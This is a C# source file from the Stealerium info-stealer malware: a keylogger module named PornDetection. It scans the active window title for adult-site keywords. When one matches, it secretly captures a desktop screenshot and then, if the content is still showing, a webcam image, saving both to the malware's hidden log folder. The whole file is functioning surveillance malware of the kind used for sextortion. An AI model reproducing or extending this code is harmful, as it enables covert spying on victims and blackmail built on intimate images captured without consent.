using System;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger
{
    internal sealed class PornDetection
    {
        private static readonly string LogDirectory = Path.Combine(
            Paths.InitWorkDir(),
            "logs", "nsfw", DateTime.Now.ToString("yyyy-MM-dd")
        );

        /// <summary>
        /// Detects NSFW activity and saves desktop and webcam screenshots if detected.
        /// </summary>
        public static void Action()
        {
            if (DetectNSFWContent())
            {
                SaveScreenshots();
            }
        }

        /// <summary>
        /// Detects target NSFW keywords in the active window.
        /// </summary>
        /// <returns>True if any NSFW content is detected, false otherwise.</returns>
        private static bool DetectNSFWContent()
        {
            try
            {
                // Check if the active window contains any porn-related keywords (case insensitive)
                var activeWindow = WindowManager.ActiveWindow.ToLower();
                return Config.PornServices.Any(keyword => activeWindow.Contains(keyword));
            }
            catch (Exception ex)
            {
                // Log any potential errors during detection
                Logging.Log($"PornDetection: Error during NSFW detection: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Saves screenshots (desktop and webcam) when NSFW content is detected.
        /// </summary>
        private static void SaveScreenshots()
        {
            try
            {
                // Create a unique directory for each detection based on current time
                var timestampedLogDir = Path.Combine(LogDirectory, DateTime.Now.ToString("HH.mm.ss"));

                if (!Directory.Exists(timestampedLogDir))
                {
                    Directory.CreateDirectory(timestampedLogDir);
                }

                // Take desktop screenshot after a short delay
                Thread.Sleep(3000);
                DesktopScreenshot.Make(timestampedLogDir);

                // Wait and take webcam screenshot if NSFW is still detected
                Thread.Sleep(12000);
                if (DetectNSFWContent())
                {
                    WebcamScreenshot.Make(timestampedLogDir);
                }
            }
            catch (Exception ex)
            {
                // Log any potential errors during screenshot saving
                Logging.Log($"PornDetection: Error saving screenshots: {ex.Message}");
            }
        }
    }
}
